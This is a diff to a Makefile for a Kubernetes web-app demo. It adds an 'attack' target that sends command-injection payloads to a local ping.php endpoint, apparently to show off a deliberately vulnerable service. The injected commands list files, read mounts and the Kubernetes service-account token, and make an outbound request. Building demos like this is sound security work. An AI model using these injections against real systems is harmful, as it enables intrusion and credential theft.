@@ -66,3 +66,11 @@ helm-uninstall:
 fwd:
 	sudo kill -9 $(sudo lsof -t -i :8080)
 	kubectl --namespace webapp port-forward $$(kubectl get pods --namespace webapp -l "app.kubernetes.io/name=mywebapp,app.kubernetes.io/instance=webapp" -o jsonpath="{.items[0].metadata.name}") 8080:80 &
+
+.PHONY: attack
+attack:
+	curl 127.0.0.1:8080/ping.php?ip=1.1.1.1\;ls
+	curl  127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20/proc/self/mounts
+	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20index.html"
+	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20/run/secrets/kubernetes.io/serviceaccount/token"
+	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcurl%20google.com"
